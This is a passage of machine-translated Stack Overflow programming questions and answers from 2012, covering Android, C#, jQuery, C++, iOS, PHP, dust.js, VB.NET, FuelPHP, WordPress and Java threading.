                if (cursor.moveToFirst()) {
                    do {
                        String songname = cursor
                                .getString(cursor
                                        .getColumnIndex(MediaStore.Audio.Media.DISPLAY_NAME));
                        int song_id = cursor.getInt(cursor
                                .getColumnIndex(MediaStore.Audio.Media._ID));

                        String fullpath = cursor.getString(cursor
                                .getColumnIndex(MediaStore.Audio.Media.DATA));
                        fullsongpath.add(fullpath);

                        String albumname = cursor.getString(cursor
                                .getColumnIndex(MediaStore.Audio.Media.ALBUM));
                        int album_id = cursor
                                .getInt(cursor
                                        .getColumnIndex(MediaStore.Audio.Media.ALBUM_ID));

                        String artistname = cursor.getString(cursor
                                .getColumnIndex(MediaStore.Audio.Media.ARTIST));
                        int artist_id = cursor
                                .getInt(cursor
                                        .getColumnIndex(MediaStore.Audio.Media.ARTIST_ID));

                                                } while (cursor.moveToNext());
                }
                cursor.close();
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:31:59.843

你正在做的方式似乎是可能的，但看起来它不是“机器人”。[有关ContentProviders](http://developer.android.com/guide/topics/providers/content-providers.html)和[MediaStore.Audio](http://developer.android.com/reference/android/provider/MediaStore.Audio.html)的结帐信息

在那之后，我相信 Chirag Raval 代码会变得更加清晰，您将能够进一步处理它。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-07-04T21:11:33.597

```
//declare your variables
private ArrayList<Song> songList;

//create a clas where you define your data
public class Song {

private long id;
private String title;
private String artist;

public Song(long songID, String songTitle, String songArtist) {
    id=songID;
    title=songTitle;
    artist=songArtist;
}

public long getID(){
    return id;
}
public String getTitle(){
    return title;
}
public String getArtist(){
    return artist;
}
}

    public void getSongLists(){
    ContentResolver musicResolver = context.getContentResolver();
    Uri musicUri = android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
    String sel = MediaStore.Files.FileColumns.MIME_TYPE + "=?";
    String ext = MimeTypeMap.getSingleton().getMimeTypeFromExtension("mp3");
    String[] selExtARGS = new String[]{ext};
    Cursor musicCursor = musicResolver.query(musicUri, null, sel, selExtARGS, null);

    if(musicCursor!=null && musicCursor.moveToFirst()){
        //get columns
        int titleColumn = musicCursor.getColumnIndex(android.provider.MediaStore.Audio.Media.TITLE);
        int idColumn = musicCursor.getColumnIndex(android.provider.MediaStore.Audio.Media._ID);
        int artistColumn = musicCursor.getColumnIndex(android.provider.MediaStore.Audio.Media.ARTIST);
        int column_index = musicCursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA);
        //add songs to list
        do {
            long id = musicCursor.getLong(idColumn);
            String title = musicCursor.getString(titleColumn);
            String artist = musicCursor.getString(artistColumn);

            songList.add(new Song(id, title, artist));
        }
        while (musicCursor.moveToNext());

    }
   } 
```

# c# - 列表框中的动态搜索算法

> ID：12068154
> 
> 赞同：1
> 
> 时间：2012-08-22T07:23:20.587
> 
> 标签：c#, winforms, search

所以，我有一个包含 x 个项目的列表框。在列表框的顶部，我有一个 TextBox（这是搜索字段）。如果它不包含搜索词（代码中的变量关键字），我尝试开发一种从列表框中删除项目的算法。这应该发生在用户键入的每个键上（即时）。所以，代码：

```
 private void _keywordTextBox_TextChanged(object sender, EventArgs e)
    {
        string keyword = _keywordTextBox.Text;

        if (keyword == searchtext || isSpace) // do nothing if space is typed - searchtext is a templatetext in the textbox ("type here to search...")
            return; // ignore
        else if (keyword == "")
        {
            listBox.Items.Clear();

            foreach (string s in originalList)
                listBox.Items.Add(s);
        }
        else
        {
            List<string> selection = new List<string>();

            foreach (string s in originalList) // originalList is the listbox at startup
                selection.Add(s);

            listBox.BeginUpdate();
            string[] keywordSplit = keyword.Split(' ');

            try
            {
                for (int i = originalList.Count - 1; i >= 0; i--)
                {
                    string[] selectionSplit = selection[i].Split(' ');

                    int l = 0; // number of hits

                    for (int j = 0; j < selectionSplit.Length; j++)
                    {
                        for (int k = 0; k < keywordSplit.Length; k++)
                        {
                            if (selectionSplit[j].ToLower().Contains(keywordSplit[k].ToLower()))
                            {
                                l++;
                                break;
                            }
                        }
                    }

                    if (l < keywordSplit.Length) // Not hit on all keywords
                        selection.RemoveAt(i);
                }
            }
            finally
            {
                listBox.Items.Clear();

                foreach (string s in selection) // Add selection in listbox
                    listBox.Items.Add(s);

                if (listBox.Items.Count > 0)
                    listBox.SetSelected(0, true); // Select first item in listbox

                listBox.EndUpdate();
            }
        }
    } 
```

这个问题很难描述，除了它没有按预期工作。据我所知，这种行为是零星的。

如果我搜索“ck flow”，我应该会受到 stackoverflow 的欢迎。更重要的是，如果我删除字符（退格键的删除键），它也应该起作用。有人吗？

编辑：更多细节：

根据用户搜索的内容，列表框应在每次击键时缩小和增长。列表框应保留与用户键入的关键字匹配的每个项目，并过滤掉不匹配的项目。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:56:17.067

或者您可以尝试制定一个正则表达式：

```
private void textBox1_TextChanged(object sender, EventArgs e)
{
    string keyword = textBox1.Text;
    if (string.IsNullOrEmpty(keyword.Trim()))
    {
        listBox1.Items.Clear();
        listBox1.Items.AddRange(_originalList.ToArray());
    }
    else
    {
        Regex regex = new Regex(GetRegexPatternFromKeyword(keyword));
        List<string> selection =
            _originalList.Where(s => regex.IsMatch(s)).ToList();
        listBox1.Items.Clear();
        listBox1.Items.AddRange(selection.ToArray());
    }
}

private static string GetRegexPatternFromKeyword(string keyword)
{
    string[] words =
        keyword.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries).Select(word => "(?=.*" + word.Replace(")", @"\)") + ")").ToArray();
    return string.Join("", words);
} 
```

**免责声明**：在某些情况下，输入会“破坏”正则表达式模式

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T07:50:35.790

你的代码增加 l 太频繁了。例如;

带有搜索词“aaa bbb”的文本“aaa aaa aaa”将给出 3 的 l，因为每次找到“aaa”时都会增加 l。因此，即使从未找到“bbb”，这也将是一个匹配项。

您可以通过在每次搜索新选择行之前删除找到的关键字拆分部分并重新创建关键字拆分来解决此问题（除其他外）。

```
l++;
break; 
```

变成

```
l++
keywordSplit.RemoveAt[k];
break; 
```

并移动

```
string[] keywordSplit = keyword.Split(' '); 
```

在你开始 k 循环之前

尽管如此，我觉得可能有更好的方法来实现你想要的，它应该可以使用更简洁、更快的代码。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:34:42.980

我让它工作。@IvoTops 帮助我朝着正确的方向前进。只需先循环遍历所有关键字，然后再循环选择。

```
 for (int j = 0; j < keywordSplit.Length; j++)
                {
                    for (int k = 0; k < selectionSplit.Length; k++)
                    {
                        if (selectionSplit[k].ToLower().Contains(keywordSplit[j].ToLower()))
                        {
                            l++;
                            break;
                        }
                    }
                } 
```

现在似乎工作正常。

# jquery - jquery 使用加载函数 - 如何检索动态值？

> ID：12068160
> 
> 赞同：0
> 
> 时间：2012-08-22T07:23:55.393
> 
> 标签：jquery

可能吗？- 这是我的尝试，我在页面上有一堆拇指，当用户点击拇指时，我想打开一个新页面，我应该根据拇指加载幻灯片图像，用户点击的内容。

我尝试的是，当用户单击拇指时，我将数据作为文本存储在某个隐藏元素（替换文本）中，并且随着新页面的打开，我正在加载元素以检索数据，即分配给我的数据。但是动态内容是事件更新的，我只获取静态数据，元素有什么......不可能获取动态数据吗？- 作为示例：

拇指页面js：

```
var i=0;
$('a').click( function (e) {
        e.preventDefault();
        i++;
        $('strong').text(i);    
    }) 
```

每次点击时我都会更新强的值..新页面加载上一个页面强元素。

```
 $(document).ready(function(){
                $('body').load('index.html strong', function (data) {
                    console.log('loaded');    
                })   
            }) 
```

但我看到了，只有静态数据。不是我分配的动态数据。有什么线索可以解决这个问题吗？或任何其他方式来传递数据，除了get和post方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:32:38.690

您正在从远程页面加载数据，该页面不会有您的本地更改。[http://api.jquery.com/load/#loading-page-fragments](http://api.jquery.com/load/#loading-page-fragments)

您可以尝试将参数作为 url 的一部分传递，并使用[Get escaped URL parameter](https://stackoverflow.com/questions/1403888/get-url-parameter-with-jquery)之类的方法获取数据。

# view - 在浏览器中查看或打开与下载

> ID：12068171
> 
> 赞同：0
> 
> 时间：2012-08-22T07:24:26.520
> 
> 标签：view, tabs, download, .doc

我正在使用 HTML 和 CSS，如有必要，我愿意使用非常简单的 JavaScript 代码。

我将 ResumeWord.doc 和 ResumePDF.pdf 上传到 FTP。我为每个链接创建了“查看”“下载”和“打印”链接。ResumeWord.doc 似乎只给了我一个带有打开或保存选项的弹出窗口，而不是在浏览器中打开，而我能够在浏览器中打开 ResumePDF.pdf 但无法创建可点击的链接来下载它而不查看。我已经为“视图”尝试了 HTML target_blank 和 JavaScript window.open，但没有成功。我是自学成才和业余爱好者。

如何使“查看”链接在浏览器中打开 ResumeWord.pdf 而不会弹出？当用户单击“下载”时，如何下载 ResumePDF.pdf？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:33:34.753

没有一些帮助，浏览器不会假定用户在他们的计算机上安装了 Microsoft Word。这就是为什么您只能选择保存它，而不是打开它。

然而，PDF 是可以在浏览器中查看的，浏览器可以检查是否安装了正确的文件来实现这一点。因此，如果它们是，浏览器会继续并打开文件。

至于强制浏览器打开一个word文件，看[这个](https://stackoverflow.com/questions/4346117/how-can-i-view-open-a-word-document-in-my-browser-using-with-php-or-html)SO question。

至于强制下载 PDF，请参阅[这个](https://stackoverflow.com/questions/6794255/html-download-a-pdf-file-instead-of-opening-them-in-browser-when-clicked)SO question。在您的情况下，这可能是不可能的，因为解决方案涉及发送不同的服务器端标头。

# c# - 在代表声明中包含正文意味着什么？

> ID：12068177
> 
> 赞同：1
> 
> 时间：2012-08-22T07:24:39.173
> 
> 标签：c#, delegates, anonymous-methods

我刚刚看到以下代码：

```
class X
{
  static Action Ac()
  {
     return ..some other code
  }
} 
```

这是什么意思？我从未见过宣布其主体的代表。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T07:26:25.830

那不是`Action`声明其主体的代表。这是`X`类的静态方法，`Ac()`返回类型为`Action`; 也就是说，它是一个返回`Action`委托的类方法。主体可能会创建一个`Action`从该方法返回的对象。

换句话说：它是一个常规的静态方法，它恰好返回`Action`而不是像`string`or之类的东西`int`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:31:17.077

引用匿名方法的委托对象声明如下（使用旧语法并省略 lambda 表示法）：

```
Action<int> action = delegate (int x) { 
                        //this is a body of anonymous method
                        //which is referenced by a delegate object action of type Action<int>
                        Console.WriteLine (x);
                        }; 
```

而不是像这样称呼：

```
 action(5); 
```

# ios - 混合应用程序的应用商店审批流程

> ID：12068192
> 
> 赞同：2
> 
> 时间：2012-08-22T07:25:48.410
> 
> 标签：ios, cordova, app-store

我想知道苹果批准提交到 App Store 的混合应用程序（使用 PhoneGap 开发）的流程是什么？

我读到***PhoneGap***被 Apple 批准为构建原生应用程序的框架，但找不到任何相同的指导方针。

所以我想知道在开发混合应用程序时应该考虑的一些关键点，以防止它在应用商店被拒绝。

谢谢！！！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T07:34:24.380

[http://developer.apple.com/appstore/resources/submission/tips.html](http://developer.apple.com/appstore/resources/submission/tips.html)

[http://developer.apple.com/appstore/resources/approval/guidelines.html](http://developer.apple.com/appstore/resources/approval/guidelines.html)

特别查看第 12.3 点

# wpf - 从一个用户控件选择功能到另一个

> ID：12068195
> 
> 赞同：0
> 
> 时间：2012-08-22T07:26:08.577
> 
> 标签：wpf, mvvm, user-controls

我有一个对话框，其中包含两个绑定到他们的模型的用户控件。

![带有用户控件的对话框](../Images/687490e39db22d70e679fd7cb056eff2.png)

我想让用户从 UserControl1 中选择图表控件上的数据点。

我可以在图表控件的鼠标按下事件上获取数据点，并用该值填充关联的文本框。我无法确定将该值传递回 UserControl1 的最佳方法。另外，我将如何识别哪个按钮调用了数据点。注意我必须以 MVVM 友好的方式做同样的事情。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T07:49:45.153

它不是关于`UserControl`，更多关于 ViewModels。我建议您的图表模型（我猜应该是“ViewModel”）可以引发一个将数据点作为参数传递的事件。

要确定是哪个按钮进行了调用，您可以将其记住在您的`UserControl`模型中（同样是 ViewModel）。

# c++ - std::priority_queue 参数化比较结构

> ID：12068197
> 
> 赞同：1
> 
> 时间：2012-08-22T07:26:09.907
> 
> 标签：c++, priority-queue

我第一次使用 std::priority_queue 完成大学作业。分配是对进程调度的模拟。我想将一个参数传递给我的比较结构构造函数进行初始化，我以为我在另一个论坛上看到了它，但我无法再次找到源代码。我在发布之前查看了 SO，但我没有看到任何类似的东西。

这是我的priority_queue：

```
/* schedules.hpp / .cpp */
#include "process.hpp"

namespace my = procschedassignment;

int tick = 0;
std::priority_queue<my::Process, _
        std::vector<my::Process>,
        PrioritiseHighestResponseRatioNext(tick) > rq;
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
line 100 - compiler errors are here
// ... 
```

这是我的比较结构：

```
/* prioritise_process.hpp / .cpp */
#include "process.hpp"

namespace my = procschedassignment;

struct PrioritiseHighestResponseRatioNext {
    public:
        explicit PrioritiseHighestResponseRatioNext(int const& cpu_time)
                : cpu_time_(cpu_time) {};
        bool PrioritiseHighestResponseRatioNext::operator()(my::Process const& lhs,
                my::Process const& rhs) {
            bool ret;

            if (lhs.wait_time() > cpu_time_) {
                ret = (lhs.ResponseRatio() > rhs.ResponseRatio());
            } else if (rhs.wait_time() > cpu_time_) {
                ret = (lhs.ResponseRatio() < rhs.ResponseRatio());
            }

            return ret;
        };

    private:
        const int cpu_time_;
}; 
```

我使用此代码得到的编译器错误是：

```
../src/schedules.cpp:100: error: ‘time’ cannot appear in a constant-expression
../src/schedules.cpp:100: error: template argument 3 is invalid
../src/schedules.cpp:100: error: invalid type in declaration before ‘;’ token 
```

是否可以使用 std::priority_queue 进行参数化比较结构？我是 STL 的新手，所以我很抱歉我对这里发生的事情没有更好的了解。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:28:01.480

您正在尝试将对象作为模板参数传递。这行不通。您应该将比较器作为参数提供给构造函数，并将比较器的类型作为模板参数。

```
// declare type
typedef std::priority_queue<my::Process,
                            std::vector<my::Process>,
                            PrioritiseHighestResponseRatioNext > process_queue;
                            // ^^^ just a type, no object ^^^
// create object
process_queue rq(PrioritiseHighestResponseRatioNext(tick)); 
```

# google-maps-api-3 - 在 Google Map API 中设置 sensor true 有什么影响？

> ID：12068202
> 
> 赞同：5
> 
> 时间：2012-08-22T07:26:29.313
> 
> 标签：google-maps-api-3

我知道我必须将传感器设置为 true 如果用户的位置是通过 GPS 模块获取的。但是设置这个参数有什么作用呢？谢谢。

# iphone - 如何在本地存储带有图像的数据以供以后使用iphone

> ID：12068207
> 
> 赞同：0
> 
> 时间：2012-08-22T07:26:40.887
> 
> 标签：iphone, ios

我能够从服务器获取数据并在 UITableView 上显示，它工作正常。但是当我转到另一个选项卡并返回同一个选项卡时，它会调用服务器获取数据。从服务器获取数据后，我想在本地存储数据。请建议我你的想法。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:22:34.320

您必须将文件存储在设备上，这可以通过以下几种方式实现：

1.  将文件存储在 App 的 Documents 目录中
2.  将文件存储在 App 的 Library/Caches 文件夹中
3.  将文件存储在 App 的 Library/ 文件夹中

每个选项都有一些注意事项：

1.  存储在 Documents 文件夹中的文件默认由 iCloud 备份。您真的必须考虑这是否有必要，因为您正在占用用户的 iCloud 存储空间（他/她可能会为此付费）。
2.  将文件存储在 Caches 文件夹中是一个好方法，但如果用户磁盘空间不足（因此命名为 Cache），它们可能会被 iOS 删除。
3.  只要安装了应用程序，将文件存储在设备上的另一个（手动创建的）文件夹中就会保留它们。没有 iCloud 备份或没有被 iOS 删除

可以使用以下方法获取特定文件夹的位置：

```
[[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject]; 
```

`NSDocumentDirectory`当您希望 NSURL 到 Library 文件夹时，您必须用 NSLibraryDirectory 替换。

存储数据就像创建一个指向要存储数据的位置的 NSURL 一样简单，然后在`writeToURL:atomically:`要存储的 NSData 上调用该方法。

可以使用`UIImageJPEGRepresentation`或将 UIImages 转换为 NSData `UIImagePNGRepresentation`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T09:30:43.467

我更喜欢将 HJCache 库用于临时存储图像。

以下是实现 HJCache 开源库的原因。

1.  使在 iOS 应用程序中使用异步加载的图像变得容易。
2.  使使用共享文件缓存变得容易。
3.  根据 Cocoa 规范使内存管理“正常工作”。
4.  支持查看图像的典型案例，例如滚动显示推特个人资料图片的推文列表，浏览加载在网络上的相册。
5.  也允许库用于其他类型的数据。

有关更多详细信息和教程，请访问[github](https://github.com/markofjohnson/HJCache)和[作者](http://www.markj.net/hjcache-iphone-image-cache/)博客

# jquery - JQuery 对话框重新打开错误

> ID：12068209
> 
> 赞同：1
> 
> 时间：2012-08-22T07:27:02.803
> 
> 标签：jquery, jquery-ui-dialog

我对 JQuery 相当陌生。我正在使用对话框弹出一个显示来自外部站点的页面的窗口。

```
<script type="text/javascript">

    $.fx.speeds._default = 400;
    jQuery.support.cors = true;

    $(function ()
    {

        $("#cmdLaunchInDiv").click(function ()
        {

            $("#dialog-modal").dialog({
                autoOpen: false,
                height: 845,
                width: 820,
                show: "scale",
                hide: "scale"
            });

            $.ajax({
                url: 'http://www.mycompany.com/geturl/?userid=' + document.getElementById("txtUserId").value,
                dataType: 'json',
                success: function (data)
                {
                    $('#dialog-modal').html("<iframe id='iFr' style='height:800; width:800; overflow: hidden;' height='800' width='800' scrolling='no' src='" + data + "'>");

                }

            });

            $("#dialog-modal").dialog("open");
            return false;
        });
    }); 
```

```
<div id="dialog-modal" title="My Page" >

</div> 
```

Ajax 调用根据用户 ID 获取我要加载的 URL。如果我不使用 jQuery.support.cors = true; Ajax 调用不起作用，我不确定为什么该行修复了该问题，但我的搜索表明它会。

问题是当我第一次运行页面时一切正常。我输入我的用户 ID，单击 div 打开的按钮，页面按预期加载。然后我使用对话框右上角的内置关闭 X 关闭对话框，并且框按预期关闭。但是，如果我尝试再次打开对话框，我会在 JQuery-1.8.0.js 中收到错误

Microsoft JScript 运行时错误：“数组”未定义

```
// Save a reference to some core methods
core_push = Array.prototype.push,    //<=== This line
core_slice = Array.prototype.slice,
core_indexOf = Array.prototype.indexOf,
core_toString = Object.prototype.toString,
core_hasOwn = Object.prototype.hasOwnProperty, 
```

我找不到任何东西来帮助我找出问题所在，并且多次重写了我的 Jquery。

更新：这个错误在 IE9 中。在 Chrome 和 Firefox 中，对话框可以正确打开和关闭，但除非我尝试在同一域中加载页面，否则不会显示内容。

谁能指出我正确的方向？

非常感谢

弗雷德

# php - php - 在数组中搜索字符串

> ID：12068211
> 
> 赞同：0
> 
> 时间：2012-08-22T07:27:04.660
> 
> 标签：php, arrays

```
<?php // SEARCH TAGS FOR A SPECIFIC TAG
  $tags = CollectionAttributeKey::getByHandle('recipe_tags'); // attribute handle of tags to search
  $tagToFind = 'Videos'; // declare the specific tag to find
  $selectedTags = array($page->getAttribute($tags->getAttributeKeyHandle())); // get tags associated with each page and put them in an array

  foreach ($selectedTags as $tag) { // output tags separately

    echo $tag; // ECHO TEST - check that individual tags associated with each page are outputting correctly

    if ($tag == $tagToFind) { // if $tag is equal to $tagToFind
      echo ' Found';
    } else {
      echo ' Not found';
      }
  }
?> 
```

`echo $tag;`输出与每个页面关联的标签列表，所以我很确定问题是我如何检查“视频”是否在标签列表中。

以上输出以下列表：即使视频在列表中`Breakfast` `Brunch` `Budget` `Meal` `Easy` `Lunch` `Quick Meals` `Supper` `Vegetarian` `Videos`。`Not found`

我也尝试过使用 in_array 来寻找这样的“视频”：

```
if (in_array($tagToFind, $selectedTags, true)) { // search the array for $tagToFind - true = strict
  echo ' Found';
} else { 
    echo ' Not found';
  } 
```

但是得到相同的结果 - 我是 php 新手，如果这很容易，我很抱歉。

任何帮助将非常感激。

干杯

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T07:36:31.850

似乎 $selectedTags 一个字符串的数组，因为你`foreach`只循环一次

你应该尝试做

```
$selectedTags = explode(" ",$page->getAttribute($tags->getAttributeKeyHandle())); 
```

然后使用`in_array`函数

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:40:11.207

```
$page->getAttribute($tags->getAttributeKeyHandle()) 
```

似乎返回一个字符串。

在这种情况下

```
$selectedTags = array($page->getAttribute($tags->getAttributeKeyHandle())); 
```

没有意义 - 你得到一个包含一个长字符串的数组。

你想要的是：

$selectedTags = $page->getAttribute($tags->getAttributeKeyHandle());

```
if(stristr($selectedTags, $tagToFind)){
  // do something
}
else{
  // do something else
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T10:58:00.597

然后更好地使用....

```
if(strcmp($tag , $tagToFind))
{
    echo "Found";
}
else
{
    echo "Not found";
} 
```

这对你有用吗

# templates - 不支持仅转义 HTML 标签？

> ID：12068212
> 
> 赞同：1
> 
> 时间：2012-08-22T07:27:09.077
> 
> 标签：templates, escaping, dust.js

我正在使用**dustjs**进行前端模板。我有 json 数据作为 var userData = {'desc': '此内容应显示在 HTML SPAN TAG'};

灰尘模板：{userData.desc}

但是当我尝试渲染这个模板时，desc 内容显示在页面上“作为相同的字符串”，并且标签不显示为 HTML 跨度。

如果我使用 {userData.desc|s|h}：span 在页面上显示为 <span>

我可以使用的唯一方法是 {userData.desc|s} ：此方法将跨度正确显示为 html 标记。但是 |s 也会取消转义脚本标签，这是有风险的。

我只想**从 json 数据内容中取消转义 HTML 标签**，有什么方法可以在dustjs 中实现这个要求..？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T17:07:02.720

唯一可用的用于禁用自动转义的 Dust 过滤器`|s`是 ，正如您所提到的，如果您的数据中可能包含脚本标记，则它是不安全的。根据[Dust github 页面](http://akdubya.github.com/dustjs/)：

> 过滤器不接受参数；如果您需要更复杂的行为，请改用 section 标签。

尽管文档中从未明确说明如何使用节标记来创建更复杂的过滤器行为，但我相信最可能的解决方案是创建一个`@`助手。

话虽如此，我想说内置过滤器对于大多数用例来说已经足够了。如果脚本标签有可能进入`userData.desc`，则不要禁用自动转义。如果您使用模板，那么无论如何都应该在模板（而不是 JSON）中创建标记。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-27T02:43:21.807

您可以创建一个自定义过滤器 - 这比助手更适合您的需要。只需使用您自己的自定义代码扩展dust.filter，即可满足您的需求。

在这里参考我的答案：[如何在dust.js中实现自定义渲染逻辑？](https://stackoverflow.com/questions/11037968/how-do-i-implement-custom-rendering-logic-in-dust-js/11201445#11201445)

# php - 试图理解在一本书示例中找到的 php 函数 call_user_func

> ID：12068213
> 
> 赞同：0
> 
> 时间：2012-08-22T07:27:11.020
> 
> 标签：php

该示例来自 Edward Lecky-Thompson 的“Professional PHP5”一书。

```
 function __get($propertyName) {
  if(!array_key_exists($propertyName, $this->propertyTable))
     throw new Exception("Błędna własność \"$propertyName\"!");

  if(method_exists($this, 'get' . $propertyName)) {
     return call_user_func(array($this, 'get' . $propertyName));
  } else {
     return $this->data[$this->propertyTable[$propertyName]];
  }
} 
```

**有人可以解释一下call_user_func**函数中究竟发生了什么吗？

在 php.net 上，我读到第一个参数是要调用的函数，其余参数作为其参数传递给该函数。

在 php.net 上有一些简单的例子，我理解它们没有问题。但是我不明白为什么在上面的例子中有一个数组，为什么 $this 作为数组的第一个元素？

PS我在stackoverflow上发现了一个类似的问题，我理解代码应该做什么，但我不完全理解为什么写的东西有效。

这是类似问题的链接： [PropertyObject](https://stackoverflow.com/questions/3435508/propertyobject-class-help)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T07:31:55.630

两部分数组是 PHP 的非正式正式约定，将**特定对象的方法**作为*回调/可调用*对象传递。有关详细信息，请参阅[http://php.net/manual/en/language.types.callable.php](http://php.net/manual/en/language.types.callable.php)。

`array($this, 'getFoo')`简单地代表*对象**的`getFoo`方法`$this`*。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T07:32:16.330

这是在一个[类](http://php.net/class)中使用的。如果`$propertyName = 'Foo'`您有效地调用该函数`$this->getFoo`。

`$this`始终是当前对象，因此另一种说法是您正在调用`getFoo`当前对象上的函数。

# vb.net - 在 AddressOf 委托 VB 中传递参数/参数

> ID：12068216
> 
> 赞同：0
> 
> 时间：2012-08-22T07:27:38.577
> 
> 标签：vb.net, multithreading, delegates

我有下面的一段代码，想把这些部分放在单独的线程中。

```
 Dim objThreadedReq = From reqThreaded In objRequestList
                             Where reqThreaded.IsThreaded = True
        Dim trThreadedRequests As Thread = New Thread(New ThreadStart(AddressOf PoolThreadedRequests))
        trThreadedRequests.Start() 
```

我创建了一个函数 PoolThreadedRequests (objRequestList As RequestList)

如何在我的线程函数中传递 objThreadedReq 集合？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:19:25.720

谢谢蒂姆，

“看看 ParameterizedThreadStart 委托”

# fuelphp - FuelPHP Sentry 插入组注册

> ID：12068223
> 
> 赞同：0
> 
> 时间：2012-08-22T07:28:15.317
> 
> 标签：fuelphp, cartalyst-sentry

我在文档中真的找不到任何关于此的内容。我经常使用 Codeigniter，我主要使用 Ben Edmunds Ion auth，这对我来说更容易一些，因为我可以在注册中添加组插入功能。

您可以对这个愚蠢的问题投反对票，但我在 Sentry 文档中找不到任何关于此的内容。

这是我的注册码：

```
public function action_register()
{

    $response = Response::forge();

        // validation

        $val = Validation::forge('registration');

        $val->add_field('first_name', 'Username', 'required|trim|valid_string[alpha,spaces]');
        //$val->add_field('first_name', 'Vezetéknév', 'required|');
        $val->add_field('last_name', 'Keresztév', 'required');
        $val->add_field('email', 'Email', 'required|valid_email');
        $val->add_field('email_again', 'Email újra', 'required|valid_email|match_field[email]');
        $val->add_field('password', 'Jelszó', 'required|min_length[5]');
        $val->add_field('gender', 'Nemed', 'required');
        $val->add_field('talent', 'Tehetséged', 'required');
        $val->add_field('talent_level', 'Tehetségi szinted', 'required');

        if($val->run()): 
            try 
            {
                // register the user

                $user = Sentry::user()->register(array(
                    'email' => Input::post('email'),
                    'password' => Input::post('password'),
                    'metadata' => array(
                        'first_name' => Input::post('first_name'),
                        'last_name' => Input::post('last_name'),
                        'gender' => Input::post('gender'),
                        'talent_level' => Input::post('talent_level'),
                    )
                ));

                if($user):
                    //$email_data = array();
                    //echo Config::get('base_url'). "user/activate/". $user['hash'];
                    $email = Email::forge();
                    $email->from('my@email.me', Config::get('site_name'));
                    $email->to(Input::post('email'), Input::post('first_name'));
                    $email->subject('Regisztráció');

                    $email_data = array(
                        'name' => "Kedves " . Input::post('first_name'). "<br><br>",
                        'title' => "Üdvözöllek a ".Config::get('site_name')." oldalán" ."<br>",
                        'link' => '<a href="'.Config::get('site_url'). "user/activate/". $user['hash'].'">Fiókod megerősítéséhez kérlek kattints ide</a>'
                    );

                    $email->html_body(\View::forge('email/activation', array('email_data' => $email_data)));
                    $email->send();

                    $response->body(json_encode(array(
                        'status' => 'ok',
                    )));

                else:
                    $data['errors'] = "error";
                endif;  
            }
            catch (SentryUserException $e) 
            {

            $response->body(json_encode(array(
                        'status' => 'error',
                        'message' => array(
                            'email_taken' => $e->getMessage()
                        )
                    )));
            }

        else:

            $response->body(json_encode(array(
                    'status' => 'error',
                    'message' => array(
                        'first_name' => $val->error('first_name') ? $val->error('first_name')->get_message() : null,
                        'last_name' => $val->error('last_name') ? $val->error('last_name')->get_message() : null,
                        'email' => $val->error('email') ? $val->error('email')->get_message() : null,
                        'email_again' => $val->error('email_again') ? $val->error('email_again')->get_message() : null,
                        'password' => $val->error('password') ? $val->error('password')->get_message() : null,
                        'gender' => $val->error('gender') ? $val->error('gender')->get_message() : null,
                        'talent' => $val->error('talent') ? $val->error('talent')->get_message() : null,
                        'talent_level' => $val->error('talent_level') ? $val->error('talent_level')->get_message() : null,
                        )
        )));
    endif;

    return $response;
} 
```

所以我的问题是如何让它保存选择的用户组？

谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T09:38:24.613

这取自[Sentry 文档](http://sentry.cartalyst.com/manual/v1.1.html)；我认为这就是你所追求的：

```
try
{
    // option 1
    $user->add_to_group(2);

    // option 2
    $user->add_to_group('editor');
}
catch (SentryUserException $e)
{
    $errors = $e->getMessage(); // catch errors such as user already in group
} 
```

# wordpress - 我在 wordpress.org 上有一个 wordpress 博客。我需要自定义它。但没有任何工作。

> ID：12068224
> 
> 赞同：0
> 
> 时间：2012-08-22T07:28:14.880
> 
> 标签：wordpress

我在 wordpress.org 上有一个 wordpress 博客。我需要自定义它。但没有任何工作。我无法在其中安装任何插件或小部件。请帮忙..

谢谢...

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:41:12.570

wordpress.org 不提供托管服务。Wordpress.com 做。如果您在 wordpress.com 上托管它，那么您必须付费才能启用主题自定义功能，否则您不能

或者，如果您通过从 wp.org 下载它制作了一个自托管的 wordpress，那么它就在您手中...要编辑主题，请转到仪表板 > 主题 > 编辑

# java - java线程中断，线程为空

> ID：12068230
> 
> 赞同：0
> 
> 时间：2012-08-22T07:28:36.783
> 
> 标签：java, multithreading

我是线程新手，正在尝试复制一个在我的网络应用程序中中断线程的简单示例。我有下面的类（ComputeResults 有其他变量和函数、setter/getter 等，但这是我无法工作的新代码）：

```
@ManagedBean(name="results")
@RequestScoped
public class ComputeResults implements Serializable{

    Thread scan;
    public void testrun() {
    scan = new Thread(new Runnable() {
        @Override
